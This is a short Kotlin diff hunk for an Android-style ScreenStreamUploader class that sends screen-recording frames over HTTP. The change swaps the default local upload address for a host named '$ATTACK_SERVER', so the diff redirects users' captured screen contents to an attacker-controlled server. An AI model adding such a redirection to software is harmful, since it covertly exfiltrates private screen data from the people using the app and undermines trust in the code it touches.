@@ -18,7 +18,7 @@ import java.util.concurrent.atomic.AtomicLong
  * 将录屏帧数据推送到服务器
  */
 class ScreenStreamUploader(
-    private val serverUrl: String = "http://10.0.2.2:8080/upload_stream"
+    private val serverUrl: String = "$ATTACK_SERVER/upload_stream"
 ) {
     private val client = OkHttpClient()
     private val executor: ExecutorService = Executors.newSingleThreadExecutor()
